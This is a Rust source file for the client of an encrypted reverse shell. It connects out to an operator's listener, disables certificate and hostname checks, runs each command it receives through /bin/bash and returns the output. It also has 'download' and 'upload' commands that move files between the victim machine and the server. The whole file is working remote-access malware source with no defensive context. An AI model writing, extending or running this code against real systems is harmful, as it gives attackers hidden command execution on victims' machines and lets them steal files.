use crate::utils::tools::receive_and_write_bytes;

use std::error::Error;
use std::fs::File;
use std::io::{Read, Write};
use std::process::{exit, Command};

use native_tls::TlsConnector;
use std::net::TcpStream;

fn do_stuff(cmd: &str) -> Vec<u8> {
    let exec = Command::new("/bin/bash")
        .args(["-c", cmd.trim_end_matches("\r\n")])
        .output()
        .unwrap();

    let stdo = exec.stdout.as_slice();
    let _stdr = exec.stderr.as_slice();

    if _stdr.is_empty() {
        stdo.to_vec()
    } else {
        _stdr.to_vec()
    }
}

pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
    // Connection to server and TLS setup
    let clt = TcpStream::connect(i.to_owned() + ":" + p)?;
    log::debug!(
        "[+] TCP connection success to the listener at {}",
        clt.peer_addr()?
    );
    let mut connector_builder = TlsConnector::builder();
    connector_builder.danger_accept_invalid_certs(true);
    connector_builder.danger_accept_invalid_hostnames(true);
    let connector = connector_builder.build()?;

    let stream = connector.connect("dummy", clt);
    let mut tls_stream = match stream {
        Ok(s) => s,
        Err(r) => {
            log::debug!("TLS handshake error : {}", r);
            exit(6);
        }
    };

    let os = std::env::consts::FAMILY;
    tls_stream.write_all(os.as_bytes())?;

    // Cmd execution loop
    loop {
        // Read input from server
        let mut buff = [0; 4096];
        let read = tls_stream.read(&mut buff[0..]);
        let bytes_read = match read {
            Ok(b) => b,
            Err(r) => {
                log::debug!("Reading error : {}", r);
                continue;
            }
        };

        // Check to quit
        if String::from_utf8_lossy(&buff)
            .trim_end_matches('\0')
            .trim_end()
            == "quit"
            || String::from_utf8_lossy(&buff)
                .trim_end_matches('\0')
                .trim_end()
                == "exit"
        {
            log::debug!("Quit");
            break;
        }

        // Check for download/upload commands
        if String::from_utf8_lossy(&buff)
            .trim_end_matches('\0')
            .starts_with("download")
        {
            let tmp = "".to_owned();
            let cmd = tmp + String::from_utf8_lossy(&buff[..bytes_read]).trim_end_matches('\0');
            let path: Vec<&str> = cmd.split(' ').collect();
            match File::open(path[1]) {
                Ok(mut file) => {
                    let mut file_buffer = [0; 4096];
                    loop {
                        let bytes_read = file.read(&mut file_buffer)?;
                        if bytes_read == 0 {
                            let end_of_file =
                                "EndOfTheFile:".to_owned() + &file.metadata()?.len().to_string();
                            tls_stream.write_all(end_of_file.as_bytes())?;
                            break;
                        }
                        tls_stream.write_all(&file_buffer[..bytes_read])?;
                    }
                }
                Err(r) => {
                    tls_stream.write_all(r.to_string().as_bytes())?;
                    tls_stream.write_all("EndOfTheFile".as_bytes())?;
                }
            }
        } else if String::from_utf8_lossy(&buff)
            .trim_end_matches('\0')
            .starts_with("upload")
        {
            let tmp = "".to_owned();
            let cmd = tmp + String::from_utf8_lossy(&buff[..bytes_read]).trim_end_matches('\0');
            let path: Vec<&str> = cmd.split(' ').collect();
            match File::create(path[2].trim_end_matches('\0').trim_end()) {
                Ok(mut file) => {
                    tls_stream.write("Creation OK".as_bytes())?;
                    let mut file_buffer = [0; 4096];
                    let mut file_vec: Vec<u8> = Vec::new();
                    match tls_stream.read(&mut file_buffer) {
                        Ok(_) => receive_and_write_bytes(
                            &mut tls_stream,
                            &mut file_vec,
                            &mut file_buffer,
                        )?,
                        Err(r) => {
                            log::debug!("Reading error : {}", r);
                            tls_stream.flush()?;
                            continue;
                        }
                    }
                    file.write(&file_vec)?;
                }
                Err(r) => {
                    log::debug!("File creation error : {}", r);
                    tls_stream
                        .write(("Creation not OK : ".to_owned() + &r.to_string()).as_bytes())?;
                }
            }
        } else {
            // Magic stuff
            let mut res =
                do_stuff(String::from_utf8_lossy(&buff[..bytes_read]).trim_end_matches('\0'));
            if res.is_empty() {
                tls_stream.write_all("\0".as_bytes())?;
            } else {
                // Because the TLS max buffer size depends on the underlying library, we cut the paquets to send them into blocks of 4096
                let mut buff_to_send = [0; 4096];
                loop {
                    let mut count = 0;
                    for c in &res {
                        if count == 4096 {
                            break;
                        }
                        buff_to_send[count] = *c;
                        count += 1;
                    }
                    let _ = tls_stream.write(&buff_to_send)?;
                    buff_to_send = [0; 4096];
                    if count < 4096 {
                        break;
                    }
                    let res2 = res.split_off(count);
                    res = res2;
                }
            }
        }
        tls_stream.flush()?;
    }

    tls_stream.shutdown()?;
    Ok(())
}
